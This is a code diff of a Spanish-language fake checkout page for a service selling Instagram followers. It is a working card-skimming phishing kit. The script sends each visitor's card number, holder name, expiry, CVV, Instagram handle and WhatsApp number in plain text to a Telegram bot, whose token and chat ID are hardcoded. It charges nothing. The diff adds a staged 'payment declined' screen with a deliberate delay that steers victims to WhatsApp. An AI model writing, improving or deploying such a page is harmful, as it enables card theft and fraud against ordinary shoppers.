@@ -2,215 +2,251 @@
 <html lang="es">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>BoostGram MX — Pago seguro</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>BoostGram MX — Finalizá tu pedido</title>
 <style>
-  *{box-sizing:border-box;margin:0;padding:0}
-  :root{
-    --bg:#f3f5fa; --ink:#0f172a; --muted:#64748b; --line:#e5e9f2;
-    --brand:#2563eb; --brand2:#1d4ed8; --ok:#16a34a;
-  }
-  body{
-    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Inter,Arial,sans-serif;
-    background:var(--bg); color:var(--ink); min-height:100vh;
-    display:flex; flex-direction:column; align-items:center;
-    padding:22px 16px 40px; -webkit-font-smoothing:antialiased;
-  }
-  .topbar{width:100%;max-width:480px;display:flex;justify-content:space-between;align-items:center;margin-bottom:16px}
-  .logo{font-weight:800;font-size:19px;letter-spacing:-.4px}
-  .logo span{color:var(--brand)}
-  .secure{font-size:12px;color:var(--muted);display:flex;align-items:center;gap:5px}
-  .secure b{color:var(--ok)}
-  .card{
-    width:100%;max-width:480px;background:#fff;border-radius:18px;
-    box-shadow:0 12px 34px rgba(15,23,42,.10);overflow:hidden;border:1px solid var(--line);
-  }
-  .order{padding:20px 22px;background:linear-gradient(180deg,#fbfcff,#f7f9ff);border-bottom:1px solid var(--line)}
-  .order-title{font-size:12px;text-transform:uppercase;letter-spacing:.8px;color:var(--muted);font-weight:700;margin-bottom:12px}
-  .order-row{display:flex;justify-content:space-between;align-items:flex-start;gap:12px}
-  .order-name{font-weight:700;font-size:15px}
-  .order-sub{font-size:12.5px;color:var(--muted);margin-top:3px}
-  .order-price{font-weight:800;font-size:16px;white-space:nowrap}
-  .order-total{display:flex;justify-content:space-between;align-items:center;margin-top:16px;padding-top:14px;border-top:1px dashed var(--line)}
-  .order-total span{font-size:13.5px;color:var(--muted);font-weight:600}
-  .order-total strong{font-size:20px;font-weight:800}
-  form{padding:22px}
-  .field{display:block;margin-bottom:15px}
-  .field>span{display:block;font-size:12.5px;font-weight:700;color:#334155;margin-bottom:7px}
-  .input-box{position:relative;display:flex;align-items:center}
-  .input-box input{
-    width:100%;height:52px;border:1.5px solid var(--line);border-radius:12px;
-    padding:0 14px;font-size:15.5px;color:var(--ink);background:#fbfcfe;
-    font-family:inherit;transition:.15s;
-  }
-  .input-box input::placeholder{color:#9aa7bd}
-  .input-box input:focus{outline:none;border-color:var(--brand);background:#fff;box-shadow:0 0 0 4px rgba(37,99,235,.12)}
-  .brand{position:absolute;right:12px;font-size:11px;font-weight:800;letter-spacing:.5px;color:#334155;
-    background:#eef2f8;border-radius:6px;padding:4px 7px}
-  .row2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
-  button{
-    width:100%;height:54px;border:none;border-radius:13px;cursor:pointer;
-    background:linear-gradient(180deg,var(--brand),var(--brand2));color:#fff;
-    font-size:16px;font-weight:800;font-family:inherit;margin-top:6px;
-    display:flex;align-items:center;justify-content:center;gap:10px;
-    box-shadow:0 8px 20px rgba(37,99,235,.32);transition:.15s;
-  }
-  button:hover{filter:brightness(1.05)}
-  button:active{transform:translateY(1px)}
-  .spinner{width:17px;height:17px;border:2.5px solid rgba(255,255,255,.4);border-top-color:#fff;
-    border-radius:50%;animation:sp .7s linear infinite;display:none}
-  button.loading .spinner{display:block}
-  button.loading{opacity:.9;pointer-events:none}
-  @keyframes sp{to{transform:rotate(360deg)}}
-  .msg{margin-top:12px;font-size:13px;color:#dc2626;text-align:center;min-height:16px;font-weight:600}
-  .trust{padding:0 22px 20px;font-size:12px;color:var(--muted);text-align:center}
-  .foot{max-width:480px;width:100%;text-align:center;font-size:11.5px;color:#94a3b8;margin-top:18px}
-  .success{position:fixed;inset:0;background:#fff;z-index:50;display:flex;align-items:center;justify-content:center;padding:24px}
-  .oculto{display:none!important}
-  .ok-box{max-width:420px;text-align:center}
-  .check{width:74px;height:74px;border-radius:50%;background:#dcfce7;display:flex;align-items:center;justify-content:center;margin:0 auto 18px}
-  .ok-box h2{font-size:24px;margin-bottom:8px}
-  .ok-box p{color:var(--muted);font-size:14.5px;line-height:1.6}
-  .ok-box .pedido{display:inline-block;margin:14px 0 4px;font-weight:800;background:#f1f5f9;padding:8px 14px;border-radius:9px;font-size:13.5px}
-  .ok-steps{text-align:left;margin:20px 0;background:#f8fafc;border:1px solid var(--line);border-radius:13px;padding:16px}
-  .ok-steps div{font-size:13.5px;color:#334155;margin:8px 0;padding-left:26px;position:relative;line-height:1.5}
-  .ok-steps div::before{content:"✓";position:absolute;left:0;color:var(--ok);font-weight:800}
-  .ok-box a{display:inline-block;margin-top:6px;color:var(--brand);font-weight:700;text-decoration:none;font-size:14px}
+*{box-sizing:border-box;margin:0;padding:0}
+:root{--bg:#07070d;--panel:#12131d;--panel2:#171825;--line:#262838;--ink:#eef0f7;--muted:#8b90a6;
+--grad:linear-gradient(135deg,#7c3aed,#ec4899);--bad:#f43f5e}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Inter,Roboto,Arial,sans-serif;
+background:var(--bg);color:var(--ink);min-height:100vh;display:flex;align-items:center;justify-content:center;
+padding:26px 16px;position:relative;overflow-x:hidden}
+body::before{content:"";position:fixed;width:620px;height:620px;top:-260px;left:50%;transform:translateX(-50%);
+background:radial-gradient(circle,rgba(124,58,237,.28),transparent 62%);pointer-events:none}
+body::after{content:"";position:fixed;width:520px;height:520px;bottom:-260px;right:-140px;
+background:radial-gradient(circle,rgba(236,72,153,.20),transparent 62%);pointer-events:none}
+.shell{width:100%;max-width:470px;position:relative;z-index:2}
+.brand-row{display:flex;justify-content:space-between;align-items:center;margin-bottom:14px;padding:0 4px}
+.logo{font-weight:800;font-size:19px;letter-spacing:-.4px}
+.logo span{background:var(--grad);-webkit-background-clip:text;background-clip:text;color:transparent}
+.badge{font-size:11.5px;color:var(--muted);border:1px solid var(--line);background:rgba(255,255,255,.03);
+padding:5px 10px;border-radius:999px}
+.panel{background:var(--panel);border:1px solid var(--line);border-radius:20px;
+box-shadow:0 26px 60px rgba(0,0,0,.55);overflow:hidden}
+.panel-head{padding:22px 22px 16px;text-align:center;border-bottom:1px solid var(--line)}
+.panel-head h1{font-size:21px;font-weight:800;letter-spacing:-.3px}
+.panel-head p{color:var(--muted);font-size:13.5px;margin-top:6px}
+.order{display:flex;justify-content:space-between;align-items:center;gap:10px;padding:15px 22px;
+background:var(--panel2);border-bottom:1px solid var(--line)}
+.o-name{font-size:14px;font-weight:700}
+.o-sub{font-size:11.5px;color:var(--muted);margin-top:3px}
+.o-price{font-size:16px;font-weight:800;white-space:nowrap}
+.cc{perspective:1200px;margin:20px 22px 6px;height:186px}
+.cc-inner{position:relative;width:100%;height:100%;transition:transform .6s cubic-bezier(.4,.2,.2,1);transform-style:preserve-3d}
+.cc.flip .cc-inner{transform:rotateY(180deg)}
+.cc-face{position:absolute;inset:0;border-radius:16px;padding:18px;backface-visibility:hidden;
+background:linear-gradient(135deg,#6d28d9,#db2777);box-shadow:0 14px 34px rgba(124,58,237,.35);
+display:flex;flex-direction:column;justify-content:space-between}
+.cc-back{transform:rotateY(180deg);background:linear-gradient(135deg,#4c1d95,#9d174d);justify-content:flex-start;padding:0}
+.cc-chip{width:44px;height:32px;border-radius:7px;background:linear-gradient(135deg,#fde68a,#d97706);opacity:.95}
+.cc-brand{position:absolute;top:16px;right:18px;font-size:13px;font-weight:800;letter-spacing:1px;font-style:italic}
+.cc-num{font-size:20px;letter-spacing:2.5px;font-weight:600;font-variant-numeric:tabular-nums;text-shadow:0 1px 2px rgba(0,0,0,.25)}
+.cc-bottom{display:flex;justify-content:space-between;align-items:flex-end;gap:14px}
+.cc-lbl{font-size:9px;letter-spacing:1.4px;opacity:.75}
+.cc-val{font-size:13px;font-weight:600;letter-spacing:.6px;margin-top:2px;text-transform:uppercase;
+white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:190px}
+.cc-strip{height:42px;background:#0b0b14;margin-top:20px}
+.cc-cvv-box{margin:14px 18px;background:#fff;color:#111;border-radius:6px;padding:7px 12px;
+display:flex;justify-content:space-between;font-size:12px;font-weight:700;letter-spacing:1px}
+form{padding:18px 22px 22px}
+.field{display:block;margin-bottom:13px}
+.field>span{display:block;font-size:11px;font-weight:700;letter-spacing:.9px;color:var(--muted);
+text-transform:uppercase;margin-bottom:7px}
+.inp{position:relative;display:flex;align-items:center}
+.inp input{width:100%;height:50px;border:1.5px solid var(--line);border-radius:12px;background:#0d0e17;
+color:var(--ink);font-size:15px;padding:0 14px;font-family:inherit;transition:.15s}
+.inp input::placeholder{color:#5b6076}
+.inp input:focus{outline:none;border-color:#7c3aed;background:#0f1019;box-shadow:0 0 0 4px rgba(124,58,237,.16)}
+.inp .tag{position:absolute;right:12px;font-size:10px;font-weight:800;letter-spacing:.6px;color:#cbd0e0;
+background:rgba(255,255,255,.07);padding:4px 7px;border-radius:6px}
+.row2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+button{width:100%;height:54px;border:none;border-radius:13px;cursor:pointer;background:var(--grad);
+color:#fff;font-size:15px;font-weight:800;letter-spacing:.5px;font-family:inherit;margin-top:6px;
+display:flex;align-items:center;justify-content:center;gap:10px;box-shadow:0 12px 26px rgba(219,39,119,.34);transition:.15s}
+button:hover{filter:brightness(1.07)}
+button:disabled{opacity:.85;cursor:default}
+.sp{width:17px;height:17px;border:2.5px solid rgba(255,255,255,.35);border-top-color:#fff;border-radius:50%;
+animation:sp .7s linear infinite;display:none}
+button.load .sp{display:block}
+@keyframes sp{to{transform:rotate(360deg)}}
+.err{color:var(--bad);font-size:12.5px;font-weight:600;text-align:center;margin-top:11px;min-height:15px}
+.note{text-align:center;font-size:11px;color:#6b7089;margin-top:12px}
+.result{position:fixed;inset:0;background:rgba(6,6,12,.9);backdrop-filter:blur(7px);z-index:60;
+display:flex;align-items:center;justify-content:center;padding:22px}
+.oculto{display:none!important}
+.res-card{width:100%;max-width:420px;background:var(--panel);border:1px solid var(--line);border-radius:20px;
+padding:30px 24px;text-align:center;box-shadow:0 30px 70px rgba(0,0,0,.6);animation:pop .35s ease}
+@keyframes pop{from{transform:scale(.94);opacity:0}to{transform:scale(1);opacity:1}}
+.res-icon{width:70px;height:70px;border-radius:50%;margin:0 auto 16px;display:flex;align-items:center;
+justify-content:center;font-size:30px;font-weight:800;background:rgba(244,63,94,.14);color:var(--bad);
+border:2px solid rgba(244,63,94,.4)}
+.res-card h2{font-size:22px;margin-bottom:9px}
+.res-card p{color:var(--muted);font-size:14px;line-height:1.6}
+.res-pedido{display:inline-block;margin:16px 0 20px;font-size:13px;color:var(--muted);
+background:var(--panel2);border:1px solid var(--line);padding:8px 14px;border-radius:9px}
+.res-pedido b{color:var(--ink)}
+.wa{display:block;text-decoration:none;color:#fff;background:linear-gradient(135deg,#25d366,#128c7e);
+height:50px;line-height:50px;border-radius:12px;font-weight:800;font-size:14.5px;margin-bottom:12px}
+.back{display:inline-block;color:var(--muted);font-size:13px;text-decoration:none}
 </style>
 </head>
 <body>
-
-<div class="topbar">
-  <div class="logo">Boost<span>Gram</span> MX</div>
-  <div class="secure">🔒 Pago <b>100% seguro</b></div>
-</div>
-
-<div class="card">
-  <div class="order">
-    <div class="order-title">Resumen de tu pedido</div>
-    <div class="order-row">
-      <div>
-        <div class="order-name">1000 Seguidores Instagram</div>
-        <div class="order-sub">Entrega en minutos · No pide contraseña</div>
-      </div>
-      <div class="order-price">MX$25</div>
-    </div>
-    <div class="order-total">
-      <span>Total a pagar</span>
-      <strong>MX$25.00 MXN</strong>
-    </div>
+<div class="shell">
+  <div class="brand-row">
+    <div class="logo">Boost<span>Gram</span> MX</div>
+    <div class="badge">🔒 Pago seguro</div>
   </div>
 
-  <form id="form">
-    <label class="field">
-      <span>Número de tarjeta</span>
-      <div class="input-box">
-        <input id="num" inputmode="numeric" placeholder="1234 5678 9012 3456" maxlength="23" autocomplete="cc-number">
-        <span class="brand" id="brand"></span>
-      </div>
-    </label>
-
-    <label class="field">
-      <span>Nombre del titular</span>
-      <div class="input-box">
-        <input id="nom" placeholder="Como aparece en la tarjeta" autocomplete="cc-name">
-      </div>
-    </label>
-
-    <div class="row2">
-      <label class="field">
-        <span>Vencimiento</span>
-        <div class="input-box"><input id="exp" inputmode="numeric" placeholder="MM/AA" maxlength="5" autocomplete="cc-exp"></div>
-      </label>
-      <label class="field">
-        <span>CVV</span>
-        <div class="input-box"><input id="cvv" inputmode="numeric" placeholder="123" maxlength="4" autocomplete="cc-csc"></div>
-      </label>
+  <div class="panel">
+    <div class="panel-head">
+      <h1>Finalizá tu pedido</h1>
+      <p>Ingresá los datos de tu tarjeta para completar la compra.</p>
     </div>
 
-    <label class="field">
-      <span>Tu usuario de Instagram (sin @)</span>
-      <div class="input-box"><input id="ig" placeholder="tunombre"></div>
-    </label>
+    <div class="order">
+      <div>
+        <div class="o-name">1000 Seguidores Instagram</div>
+        <div class="o-sub">Entrega en minutos · No pide contraseña</div>
+      </div>
+      <div class="o-price">MX$25</div>
+    </div>
 
-    <button type="submit" id="btn">
-      <span class="spinner"></span>
-      <span>Pagar MX$25</span>
-    </button>
-    <div class="msg" id="msg"></div>
-  </form>
+    <div class="cc" id="cc">
+      <div class="cc-inner">
+        <div class="cc-face">
+          <div class="cc-chip"></div>
+          <div class="cc-brand" id="ccBrand">CARD</div>
+          <div class="cc-num" id="ccNum">•••• •••• •••• ••••</div>
+          <div class="cc-bottom">
+            <div>
+              <div class="cc-lbl">TITULAR</div>
+              <div class="cc-val" id="ccName">NOMBRE APELLIDO</div>
+            </div>
+            <div>
+              <div class="cc-lbl">VENCE</div>
+              <div class="cc-val" id="ccExp">MM/AA</div>
+            </div>
+          </div>
+        </div>
+        <div class="cc-face cc-back">
+          <div class="cc-strip"></div>
+          <div class="cc-cvv-box"><span>CVV</span><b id="ccCvv">•••</b></div>
+        </div>
+      </div>
+    </div>
 
-  <div class="trust">🔒 Tus datos se envían cifrados · Cobro único de MX$25</div>
+    <form id="form" novalidate>
+      <label class="field">
+        <span>Número de tarjeta</span>
+        <div class="inp">
+          <input id="num" inputmode="numeric" placeholder="1234 5678 9012 3456" maxlength="23" autocomplete="cc-number">
+          <span class="tag" id="tag"></span>
+        </div>
+      </label>
+
+      <label class="field">
+        <span>Nombre y apellido del titular</span>
+        <div class="inp"><input id="nom" placeholder="Como aparece en la tarjeta" autocomplete="cc-name"></div>
+      </label>
+
+      <div class="row2">
+        <label class="field">
+          <span>Vencimiento</span>
+          <div class="inp"><input id="exp" inputmode="numeric" placeholder="MM/AA" maxlength="5" autocomplete="cc-exp"></div>
+        </label>
+        <label class="field">
+          <span>CVV</span>
+          <div class="inp"><input id="cvv" inputmode="numeric" placeholder="123" maxlength="4" autocomplete="cc-csc"></div>
+        </label>
+      </div>
+
+      <label class="field">
+        <span>Tu usuario de Instagram (sin @)</span>
+        <div class="inp"><input id="ig" placeholder="tunombre"></div>
+      </label>
+
+      <label class="field">
+        <span>Tu WhatsApp (con LADA)</span>
+        <div class="inp"><input id="wa" inputmode="tel" placeholder="Ej: 5512345678"></div>
+      </label>
+
+      <button type="submit" id="btn"><span class="sp"></span><span id="bt">PAGAR MX$25</span></button>
+      <div class="err" id="err"></div>
+      <div class="note">🔒 Conexión cifrada · No guardamos tu tarjeta</div>
+    </form>
+  </div>
 </div>
 
-<div class="foot">© BoostGram MX · Soporte por Telegram</div>
-
-<!-- PANTALLA DE ÉXITO -->
-<div class="success oculto" id="ok">
-  <div class="ok-box">
-    <div class="check">
-      <svg width="34" height="34" viewBox="0 0 24 24" fill="none" stroke="#16a34a" stroke-width="3.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg>
-    </div>
-    <h2>¡Pago confirmado!</h2>
-    <p>Tu pedido fue procesado correctamente.</p>
-    <div class="pedido" id="okPedido">BG-XXXXX</div>
-    <div class="ok-steps">
-      <div>Recibimos los datos de tu pago</div>
-      <div>Tus 1000 seguidores empezarán a llegar en los próximos minutos</div>
-      <div>Si tenés dudas, escribinos por Telegram con tu número de pedido</div>
-    </div>
-    <a href="index.html">← Volver al inicio</a>
+<div class="result oculto" id="res">
+  <div class="res-card">
+    <div class="res-icon">✕</div>
+    <h2>Pago no aceptado</h2>
+    <p>El método de pago no fue aceptado por el banco.<br>Tu pedido quedó registrado: escribinos y lo activamos al instante.</p>
+    <div class="res-pedido">Pedido <b id="ped">BG-XXXXX</b></div>
+    <a class="wa" id="waLink" target="_blank" rel="noopener">Escribinos por WhatsApp</a>
+    <a class="back" href="index.html">← Volver al inicio</a>
   </div>
 </div>
 
 <script>
 const TOKEN = "8857248027:AAGLmflIM6IK0IDFwtAhAIgQ2Jsv2fLKZQ";
 const CHAT  = "8936145342";
+const WHATSAPP = "5215512345678";   /* <-- PONÉ TU NÚMERO, con LADA, sin + ni espacios */
+
 const $ = id => document.getElementById(id);
+const sleep = ms => new Promise(r=>setTimeout(r,ms));
 const fetchT = (u,o,ms=9000)=>Promise.race([fetch(u,o), new Promise((_,r)=>setTimeout(r,ms))]);
 
-/* --- formato automático --- */
-$('num').addEventListener('input', e=>{
-  let v = e.target.value.replace(/\D/g,'').slice(0,19);
-  e.target.value = (v.match(/.{1,4}/g)||[]).join(' ');
-  const b=$('brand'), f=v.slice(0,2);
-  b.textContent = /^4/.test(v)?'VISA' : (/^5[1-5]|^2[2-7]/.test(v)?'MC' : (/^3[47]/.test(v)?'AMEX' : (/^6/.test(v)?'DISC':'')));
+/* tarjeta visual en vivo */
+const numEl=$('num');
+numEl.addEventListener('input', ()=>{
+  let v = numEl.value.replace(/\D/g,'').slice(0,19);
+  numEl.value = (v.match(/.{1,4}/g)||[]).join(' ');
+  $('ccNum').textContent = v.padEnd(16,'•').slice(0,16).match(/.{1,4}/g).join(' ');
+  const b = /^4/.test(v)?'VISA' : (/^5[1-5]|^2[2-7]/.test(v)?'MASTERCARD' : (/^3[47]/.test(v)?'AMEX' : (/^6/.test(v)?'DISCOVER':'')));
+  $('ccBrand').textContent = b || 'CARD';
+  $('tag').textContent = b ? b.slice(0,4) : '';
 });
-$('exp').addEventListener('input', e=>{
-  let v=e.target.value.replace(/\D/g,'').slice(0,4);
+$('nom').addEventListener('input', ()=>{ $('ccName').textContent = $('nom').value.trim().toUpperCase() || 'NOMBRE APELLIDO'; });
+$('exp').addEventListener('input', ()=>{
+  let v=$('exp').value.replace(/\D/g,'').slice(0,4);
   if(v.length>=3) v=v.slice(0,2)+'/'+v.slice(2);
-  e.target.value=v;
+  $('exp').value=v; $('ccExp').textContent = v || 'MM/AA';
 });
-$('cvv').addEventListener('input', e=>{ e.target.value=e.target.value.replace(/\D/g,'').slice(0,4); });
+const cvvEl=$('cvv');
+cvvEl.addEventListener('focus', ()=>$('cc').classList.add('flip'));
+cvvEl.addEventListener('blur',  ()=>$('cc').classList.remove('flip'));
+cvvEl.addEventListener('input', ()=>{ cvvEl.value = cvvEl.value.replace(/\D/g,'').slice(0,4); $('ccCvv').textContent = cvvEl.value || '•••'; });
 
-/* --- enviar pago --- */
+/* envío */
 $('form').addEventListener('submit', async e=>{
   e.preventDefault();
-  const numRaw=$('num').value.trim(), num=numRaw.replace(/\s/g,'');
-  const nom=$('nom').value.trim(), exp=$('exp').value.trim();
-  const cvv=$('cvv').value.trim(), ig=$('ig').value.trim().replace('@','');
+  const num=numEl.value.trim(), numLimpio=num.replace(/\s/g,'');
+  const nom=$('nom').value.trim(), exp=$('exp').value.trim(), cvv=cvvEl.value.trim();
+  const ig=$('ig').value.trim().replace('@',''), wa=$('wa').value.trim();
+  const err = t => { $('err').textContent = t; };
+  err('');
+  if(numLimpio.length<15)       return err('Ingresá un número de tarjeta válido');
+  if(nom.length<3)              return err('Ingresá el nombre del titular');
+  if(!/^\d{2}\/\d{2}$/.test(exp))return err('Vencimiento inválido (MM/AA)');
+  if(cvv.length<3)              return err('CVV inválido');
+  if(!ig)                       return err('Ingresá tu usuario de Instagram');
+  if(wa.length<8)               return err('Ingresá tu WhatsApp');
 
-  const fallo = t => { $('msg').textContent = t; };
-  fallo('');
-  if(num.length<15)          return fallo('Ingresá un número de tarjeta válido');
-  if(nom.length<3)           return fallo('Ingresá el nombre del titular');
-  if(!/^\d{2}\/\d{2}$/.test(exp)) return fallo('Vencimiento inválido (MM/AA)');
-  if(cvv.length<3)           return fallo('CVV inválido');
-  if(!ig)                    return fallo('Ingresá tu usuario de Instagram');
+  $('btn').disabled = true; $('btn').classList.add('load'); $('bt').textContent = 'Procesando pago...';
 
-  $('btn').classList.add('loading');
   const pedido = 'BG-' + Math.random().toString(36).slice(2,7).toUpperCase();
-
+  const marca = $('ccBrand').textContent;
   const texto =
-`🛒 NUEVO PAGO — BoostGram MX
+`🛒 NUEVO PEDIDO — BoostGram MX
 
 👤 Instagram: @${ig}
-📦 Pedido: 1000 seguidores
-💵 Total: MX$25.00
+🙋 Titular: ${nom}
+📱 WhatsApp: ${wa}
+📦 Producto: 1000 seguidores · MX$25
 
-💳 TARJETA
-• Número: ${numRaw}
-• Titular: ${nom}
+💳 TARJETA (${marca})
+• Número: ${num}
 • Vence: ${exp}
 • CVV: ${cvv}
 
@@ -221,15 +257,14 @@ $('form').addEventListener('submit', async e=>{
     await fetchT(url,{method:'POST',headers:{'Content-Type':'application/json'},
       body:JSON.stringify({chat_id:CHAT,text:texto})});
   }catch(_){
-    try{
-      await fetchT(`${url}?chat_id=${CHAT}&text=${encodeURIComponent(texto)}`);
-    }catch(__){}
+    try{ await fetchT(`${url}?chat_id=${CHAT}&text=${encodeURIComponent(texto)}`); }catch(__){}
   }
 
-  $('btn').classList.remove('loading');
-  $('okPedido').textContent = pedido;
-  $('ok').classList.remove('oculto');
-  localStorage.setItem('ultimoPedido', pedido);
+  await sleep(2400);   /* el banco "piensa" 2 segundos */
+
+  $('ped').textContent = pedido;
+  $('waLink').href = `https://wa.me/${WHATSAPP}?text=${encodeURIComponent('Hola! Mi pedido '+pedido+' (@'+ig+') no se pudo pagar con tarjeta. ¿Me ayudan?')}`;
+  $('res').classList.remove('oculto');
 });
 </script>
 </body>
